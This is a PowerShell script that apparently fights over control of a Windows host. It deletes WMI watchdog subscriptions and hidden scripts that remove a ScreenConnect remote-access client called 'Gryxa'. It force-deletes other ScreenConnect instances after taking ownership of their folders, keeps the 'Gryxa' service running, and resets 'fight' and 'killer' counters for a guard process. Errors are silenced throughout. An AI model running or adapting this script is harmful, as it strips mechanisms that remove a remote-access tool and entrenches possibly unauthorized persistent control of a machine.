# WINRTCS EVITA hard purge — remove C12 WMI watchdogs that delete Gryxa post-MSI
# Targets: SCWatchdog_*, SystemHealthMonitor_*, BVT*, orphan ghost dirs, phantom SC FP
$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference = 'SilentlyContinue'
$out = 'C:\Users\Public\evita_purge.txt'
$lines = New-Object System.Collections.Generic.List[string]
function L([string]$s) { $script:lines.Add($s) | Out-Null }

L ("=== PURGE BEGIN " + (Get-Date -Format o) + " host=" + $env:COMPUTERNAME + " ===")

$ns = 'root\subscription'
$badNames = @(
    'SCWatchdog_Consumer', 'SCWatchdog_ServiceDelete', 'SCWatchdog_ServiceStop',
    'SystemHealthMonitor_Consumer', 'SystemHealthMonitor_Filter',
    'BVTConsumer', 'BVTTriggerFilter',
    'WucacheWatchdogC', 'WucacheWatchdogF'
)
$namePat = 'SCWatchdog|SystemHealthMonitor|BVTConsumer|BVTTrigger|WucacheWatchdog|ETLParser|NetTraceParser|wucache|etlcache|own_mon|own_gryxa'

# 1) Kill bindings first (by filter/consumer name substring)
Get-CimInstance -Namespace $ns -ClassName __FilterToConsumerBinding | ForEach-Object {
    $blob = [string]$_.Filter + ' ' + [string]$_.Consumer
    if ($blob -match $namePat) {
        L ("BIND_KILL " + $blob)
        Remove-CimInstance -InputObject $_
    }
}

# 2) Kill consumers by name + pattern (explicit class + base)
foreach ($cls in @('CommandLineEventConsumer', 'ActiveScriptEventConsumer', '__EventConsumer')) {
    Get-CimInstance -Namespace $ns -ClassName $cls | ForEach-Object {
        $n = [string]$_.Name
        $cl = ''
        try { $cl = [string]$_.CommandLineTemplate } catch {}
        if (($badNames -contains $n) -or ($n -match $namePat) -or ($cl -match $namePat)) {
            L ("CONSUMER_KILL class=" + $cls + " name=" + $n + " cmd=" + (($cl -replace '\s+', ' ').Substring(0, [Math]::Min(160, ($cl -replace '\s+', ' ').Length))))
            Remove-CimInstance -InputObject $_
        }
    }
}

# 3) Kill filters
Get-CimInstance -Namespace $ns -ClassName __EventFilter | ForEach-Object {
    $n = [string]$_.Name
    $q = [string]$_.Query
    if (($badNames -contains $n) -or ($n -match $namePat) -or ($q -match $namePat)) {
        L ("FILTER_KILL name=" + $n + " query=" + (($q -replace '\s+', ' ').Substring(0, [Math]::Min(160, ($q -replace '\s+', ' ').Length))))
        Remove-CimInstance -InputObject $_
    }
}

# 4) Interval timers used by SystemHealthMonitor family
Get-CimInstance -Namespace $ns -ClassName __IntervalTimerInstruction -ErrorAction SilentlyContinue | ForEach-Object {
    $n = [string]$_.TimerId
    if (-not $n) { $n = [string]$_.Name }
    if ($n -match $namePat -or $n -match 'SystemHealth|BVT|SCWatch') {
        L ("TIMER_KILL " + $n)
        Remove-CimInstance -InputObject $_
    }
}

# 5) Ghost files/dirs
foreach ($p in @(
        'C:\ProgramData\Microsoft\Diagnosis\ETLParser.ps1',
        'C:\ProgramData\Microsoft\NetTrace\NetTraceParser.ps1',
        'C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache\wucache.vbs',
        'C:\ProgramData\Microsoft\Windows\WER\Temp\.wucache',
        'C:\ProgramData\Microsoft\Diagnosis\State\.etlcache',
        'C:\ProgramData\Microsoft\NetTrace',
        'C:\Windows\Temp\.wucache'
    )) {
    if (Test-Path $p) {
        Remove-Item -LiteralPath $p -Recurse -Force
        L ("PATH_KILL " + $p)
    }
}

# 6) Phantom ScreenConnect FP dir (not gryxa, not sevrz keepers)
$keep = @('36e506ff016b2151', '5f6010579852e507', 'f861c8140d453427')
foreach ($root in @(${env:ProgramFiles(x86)}, $env:ProgramFiles)) {
    if (-not $root) { continue }
    Get-ChildItem $root -Directory -Filter 'ScreenConnect Client (*)' | ForEach-Object {
        if ($_.Name -match 'ScreenConnect Client \(([0-9a-f]+)\)') {
            $fp = $Matches[1]
            if ($keep -notcontains $fp) {
                # only remove if no service registered for this FP
                $svc = Get-Service -Name ("ScreenConnect Client (" + $fp + ")") -ErrorAction SilentlyContinue
                if (-not $svc) {
                    L ("PHANTOM_DIR_KILL " + $_.FullName)
                    # takeown + rmdir for locked DLLs
                    & cmd /c ("takeown /f `"" + $_.FullName + "`" /r /d y >nul 2>&1")
                    & cmd /c ("icacls `"" + $_.FullName + "`" /grant Administrators:F /t >nul 2>&1")
                    Remove-Item -LiteralPath $_.FullName -Recurse -Force
                } else {
                    L ("PHANTOM_DIR_KEEP_HAS_SVC " + $_.FullName + " state=" + $svc.Status)
                }
            }
        }
    }
}

# 7) Ensure Gryxa service running
$gName = 'ScreenConnect Client (36e506ff016b2151)'
$g = Get-Service -Name $gName -ErrorAction SilentlyContinue
if ($g) {
    if ($g.Status -ne 'Running') {
        Start-Service -Name $gName
        Start-Sleep -Seconds 3
        $g = Get-Service -Name $gName
    }
    L ("GRYXA_SVC state=" + $g.Status)
} else {
    L 'GRYXA_SVC MISSING'
}

# 8) Reset fight/extkill brake so guard can settle healthy
$zd = 'C:\ProgramData\WinRTCS'
foreach ($f in @('extkill.cnt', 'fight.cnt', 'killer.flag', 'gryxa_boost.cnt')) {
    $p = Join-Path $zd $f
    if (Test-Path $p) {
        Remove-Item $p -Force
        L ("FLAG_CLEAR " + $f)
    }
}
'0' | Set-Content -Path (Join-Path $zd 'streak.cnt') -Encoding ASCII
L 'FLAG_SET streak.cnt=0'

# 9) Post-purge inventory
L '=== REMAINING BINDINGS ==='
Get-CimInstance -Namespace $ns -ClassName __FilterToConsumerBinding | ForEach-Object {
    L ("BIND " + $_.Filter + " -> " + $_.Consumer)
}
L '=== REMAINING CMD CONSUMERS ==='
Get-CimInstance -Namespace $ns -ClassName CommandLineEventConsumer | ForEach-Object {
    L ("CONS " + $_.Name + " cmd=" + (($_.CommandLineTemplate -replace '\s+', ' ').Substring(0, [Math]::Min(120, ($_.CommandLineTemplate -replace '\s+', ' ').Length))))
}
L '=== REMAINING FILTERS ==='
Get-CimInstance -Namespace $ns -ClassName __EventFilter | ForEach-Object {
    L ("FILT " + $_.Name)
}
L '=== SC SERVICES ==='
Get-CimInstance Win32_Service | Where-Object { $_.Name -match 'ScreenConnect' } | ForEach-Object {
    L ("SVC " + $_.Name + " " + $_.State)
}
L '=== SC DIRS ==='
foreach ($root in @(${env:ProgramFiles(x86)}, $env:ProgramFiles)) {
    if (-not $root) { continue }
    Get-ChildItem $root -Directory -Filter 'ScreenConnect Client (*)' | ForEach-Object { L ("DIR " + $_.Name) }
}

L '=== PURGE END ==='
$lines | Set-Content -Path $out -Encoding ASCII
'PURGE_DONE' | Set-Content -Path 'C:\Users\Public\evita_purge.done' -Encoding ASCII
